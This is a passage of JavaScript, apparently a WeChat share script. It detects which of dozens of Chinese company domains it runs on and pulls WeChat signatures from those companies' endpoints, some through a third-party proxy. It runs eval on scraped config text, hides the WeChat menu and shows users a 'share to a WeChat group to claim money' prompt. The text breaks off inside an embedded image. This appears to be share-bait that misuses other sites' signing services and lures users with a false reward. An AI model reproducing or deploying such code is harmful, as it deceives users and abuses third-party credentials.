            'nonceStr': config['noncestr'],
            'timestamp': config['timestamp'],
            'signature': config['signature'],
          });
        }
      });
  }

  function inke_config () {
    $.ajax(
      {
        type: "GET",
        url: '//actapi.busi.inke.cn/app/wx_share_config',
        dataType: "json",
        success: function (d) {
          var config = d.data;
          config['appId'] = config['appid'];
          config['nonceStr'] = config['noncestr'];
          jssdk_config(config);
        }
      });
  }

  function pchome_config () {
    function success (text) {
      var reg = /wx\.config\(([^\)]*)\)/;
      reg.test(text);
      var s = RegExp.$1;
      s = 'window.wx_config=' + s;
      eval(s);
      var config = window.wx_config;
      jssdk_config(config);
    }

    function fail (code) {
    }

    var request = new XMLHttpRequest(); // 新建XMLHttpRequest对象

    request.onreadystatechange = function () { // 状态发生变化时，函数被回调
      if (request.readyState === 4) { // 成功完成
        // 判断响应结果:
        if (request.status === 200) {
          // 成功，通过responseText拿到响应的文本:
          return success(request.responseText);
        } else {
          // 失败，根据响应码判断失败原因:
          return fail(request.status);
        }
      } else {
        // HTTP请求还在继续...
      }
    };

// 发送请求:
    request.open('GET', '//ylruiji.com/sign?site=pchome&url=' + encodeURIComponent(location.href.split('#')[0]));
    request.send();
  }

  function weinisongdu_config () {
    $.getJSON('http://qmks.weinisongdu.com/getSignPackage?url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = d;
      jssdk_config(config);
    });
  }

  function shunfeng_config () {
    $.getJSON('https://ylruiji.com/sign?site=shunfeng&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = {
        appId: d.appId,
        timestamp: d.timestamp,
        nonceStr: d.noncestr,
        signature: d.signature
      };
      jssdk_config(config);
    });
  }

  function amap_config () {
    $.ajax(
      {
        type: "GET",
        url: 'https://wb.amap.com/sign.php',
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          var config = d;
          jssdk_config(config);
        }
      });
  }

  function xinhuanet_config () {
    var currentUrl = location.href.split('#')[0];
    $.ajax(
      {
        type: "GET",
        url: '//api.home.news.cn/wx/jsapi.do?mpId=356&url=' + encodeURIComponent(currentUrl),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          var config = d.content;
          if (d.content.url === currentUrl) {
            jssdk_config(config);
          } else {
            xinhuanet_config();
          }
        }
      });
  }

  function nos_config () {
    $.getScript('//wxsign.nie.netease.com/sharecom/wxjs.php?url=' + encodeURIComponent(location.href.split('#')[0]), function () {
      jssdk_config(wx_conf);
    });
  }

  function cyzone_config () {
    $.getJSON('http://api1.cyzone.cn/v1/member/tools/jsSign?url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = d.data;
      jssdk_config(config);
    });
  }

  function baidu_config () {
    $.ajax(
      {
        type: "GET",
        url: 'https://po.baidu.com/api/wechat/token.jsonp?app_id=wxadc1a0c6b9096e89&url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          var config = d.data;
          jssdk_config(config);
          setTimeout(function () {
            jssdk_config(config);
          }, 500);
        }
      });
  }

  function haozu_config () {
    $.get('', function (html) {
      var reg = /wx\.config\(([^\)]*)\)/;
      reg.test(html);
      var s = RegExp.$1;
      s = 'window.wx_config=' + s;
      eval(s);
      var config = window.wx_config;
      jssdk_config(config);
      setTimeout(function () {
        jssdk_config(config);
      }, 500);
    });
  }

  function baihe_config () {
    $.getJSON('http://m.hunli.baihe.com/wechat/getJsSign?url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = d.data.result;
      jssdk_config(config);
    });
  }

  function wx189_config () {
    $.getJSON('https://wechat.e.189.cn/api/wechat/jsapi/signature.do?cid=telecom_user_center&appid=21cn&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      jssdk_config({
        appId: d.appId,
        timestamp: d.timestamp,
        nonceStr: d.noncestr,
        signature: d.signature
      });
    });
  }

  function suning_config () {
    var url = 'https://act.suning.com/act-wap-web/wap/public/getWechatToken.htm?url=' + encodeURIComponent(location.href.split('#')[0]) + '&isAuthorized=true';
    $.ajax({
      type: "GET",
      url: url,
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'cb',
      data: {},
      success: function (d) {
        var config = d;
        jssdk_config(config);
      }
    })
  }

  function hnair_config () {
    var url = 'https://wx.hnair.com/wxoauth/sns/getSignInfo?_=' + (+new Date()) + '&signurl=' + encodeURIComponent(location.href.split('#')[0]);
    $.ajax({
      type: "GET",
      url: url,
      dataType: "jsonp",
      jsonp: "jcb",
      data: {},
      success: function (d) {
        var config = JSON.parse(d);
        jssdk_config(config);
      }
    })
  }

  function jssdk_config (config) {
    config['jsApiList'] = ['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideMenuItems', 'showMenuItems'];
    if (M.getParam('debug') === '1') {
      config['debug'] = true;
      alert(config['appId']);
      alert(JSON.stringify(config));
    } else {
      config['debug'] = false;
    }
    wx.config(config);
    wx.ready(function () {
      if (location_host.indexOf('dajie.com') > -1) {
        setTimeout(function () {
          if (location_host.indexOf('dangdang.com') > -1) {
          } else {
            wx.hideOptionMenu();
          }
          if (M.getParam('debugx') === '1') {
            wx.showMenuItems({
              menuList: [
                'menuItem:share:timeline',
                'menuItem:share:appMessage',
              ]
            });
          } else {
            wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
          }
          shareFriend(window.data.to_group);
          shareTimeline(window.data.to_timeline);
        }, 200);

        setTimeout(function () {
          if (location_host.indexOf('dangdang.com') > -1) {
          } else {
            wx.hideOptionMenu();
          }
          if (M.getParam('debugx') === '1') {
            wx.showMenuItems({
              menuList: [
                'menuItem:share:timeline',
                'menuItem:share:appMessage',
              ]
            });
          } else {
            wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
          }
          shareFriend(window.data.to_group);
          shareTimeline(window.data.to_timeline);
        }, 500);

      } else {
        if (location_host.indexOf('dangdang.com') > -1) {
        } else {
          wx.hideOptionMenu();
        }
        if (M.getParam('debugx') === '1') {
          wx.showMenuItems({
            menuList: [
              'menuItem:share:timeline',
              'menuItem:share:appMessage',
            ]
          });
        } else {
          wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
        }
      }

    });

    shareFriend(window.data.to_group);
    shareTimeline(window.data.to_timeline);
  }

  function start_load () {
    var data = window.data;
    if (data.attached['timeline_ad']) timeline_ad = true;
    if (data.attached['group_ad']) group_ad = true;

    if (window.data.attached.signmode === 'jssdk') {
      if (location.host.indexOf('m.ymatou.com') > -1) {
        ymatou_config();
      } else if (location.host.indexOf('my.lotour.com') > -1) {
        lotour_config();
      } else if (location.host.indexOf('wenjuan.com') > -1) {
        wenjuan_config();
      } else if (location_host.indexOf('dangdang.com') > -1) {
        dangdang_config();
      } else if (location_host.indexOf('fang.com') > -1) {
        fang_config();
      } else if (location_host.indexOf('dajie.com') > -1) {
        dajie_config();
      } else if (location_host.indexOf('huajiao.com') > -1) {
        huajiao_config();
      } else if (location_host.indexOf('chinahr.com') > -1) {
        chinahr_config();
      } else if (location_host.indexOf('focus.cn') > -1) {
        focus_config();
      } else if (location_host.indexOf('sina.cn') > -1) {
        sina_config();
      } else if (location_host.indexOf('zcool.com.cn') > -1) {
        zcool_config();
      } else if (location_host.indexOf('163.com') > -1) {
        music_163_config();
      } else if (location_host.indexOf('ifeng.com') > -1) {
        ifeng_config();
      } else if (location_host.indexOf('sogou.com') > -1) {
        sougou_config();
      } else if (location_host.indexOf('bama555.com') > -1) {
        bama555_config();
      } else if (location_host.indexOf('amap.com') > -1) {
        amap_config();
      } else if (location_host.indexOf('cyzone.cn') > -1) {
        cyzone_config();
      } else if (location_host.indexOf('jia.com') > -1) {
        jia_config();
      } else if (location_host.indexOf('jumei.com') > -1) {
        jumei_config();
      } else if (location_host.indexOf('ivwen.com') > -1) {
        meipian_config();
      } else if (location_host.indexOf('meipian') > -1) {
        meipian_config();
      } else if (location_host.indexOf('leju.com') > -1 || location_host.indexOf('sina.com.cn') > -1) {
        leju_config();
      } else if (location_host.indexOf('hnair.com') > -1) {
        hnair_config();
      } else if (location_host.indexOf('inke.cn') > -1) {
        inke_config();
      } else if (location_host.indexOf('shijue.me') > -1) {
        shijue_config();
      } else if (location_host.indexOf('netease.com') > -1) {
        nos_config();
      } else if (location_host.indexOf('58che.com') > -1) {
        che_config();
      } else if (location_host.indexOf('douyu.com') > -1) {
        douyu_config();
      } else if (location_host.indexOf('zol.com.cn') > -1) {
        zol_config();
      } else if (location_host.indexOf('seeyouyima.com') > -1) {
        seeyouyima_config();
      } else if (location_host.indexOf('mia.com') > -1) {
        mia_config();
      } else if (location_host.indexOf('sfbest.com') > -1) {
        shunfeng_config();
      } else if (location_host.indexOf('pchome') > -1) {
        pchome_config();
      } else if (location_host.indexOf('weinisongdu.com') > -1) {
        weinisongdu_config();
      } else if (location_host.indexOf('17173.com') > -1) {
        c_17173_config();
        chanyou_config();
      } else if (location_host.indexOf('gzl.cn') > -1) {
        gzl_config();
      } else if (location_host.indexOf('zhiye.com') > -1) {
        zhiye_config();
      } else if (location_host.indexOf('baidu.com') > -1) {
        baidu_config();
      } else if (location_host.indexOf('xinhuanet.com') > -1) {
        xinhuanet_config();
      } else if (location_host.indexOf('haozu.com') > -1) {
        haozu_config();
      } else if (location_host.indexOf('189.cn') > -1) {
        wx189_config();
      } else if (location_host.indexOf('baihe.com') > -1) {
        baihe_config();
      } /*else if (location_host.indexOf('rabbitpre.com') > -1) {
        rabbitpre_config();
      } */ else if (location_host.indexOf('suning.com') > -1) {
        suning_config();
      } else if (location_host.indexOf('kujiale.com') > -1) {
        kujiale_config();
      } else if (location_host.indexOf('mafengwo.cn') > -1) {
        mafengwo_config();
      } else if (location_host.indexOf('hexun.com') > -1) {
        hexun_config();
      } else if (location_host.indexOf('pingan') > -1) {
        pingan_config();
      } else {
        if (window['g_shareData'] && window['g_shareData']['jssdk']) {
          jssdk_config(g_shareData['jssdk']);
        }
      }
    } else {
      WeixinJSBridge.call('showOptionMenu');
    }
    shareFriend();
    shareTimeline();
  }

  function init () {
    if (typeof WeixinJSBridge === "undefined") {
      if (document.addEventListener) {
        document.addEventListener('WeixinJSBridgeReady', start_load, false);
      } else if (document.attachEvent) {
        document.attachEvent('WeixinJSBridgeReady', start_load);
        document.attachEvent('onWeixinJSBridgeReady', start_load);
      }
    } else {
      start_load();
    }
  }

  window.g_share = {
    init: init,
  }

}())


;(function () {

  var config = {
    tpl: {
      body: [
        '<div class="share-container">',
        '  <h3 class="share-container-bg-title">分享点这里</h3>',
        '  <div class="share-prompt">',
        '    <p>',
        '      点击右上角，分享到',
        '      <i class="icon_share"></i>',
        '      <span class="js_share_to_desc">微信群</span>',
        '    </p>',
        '    <p>即可领取￥<span>%(money)</span>￥</p>',
        '  </div>',
        '  <div class="red-packet">',
        '    <img src="data:image/png;base64,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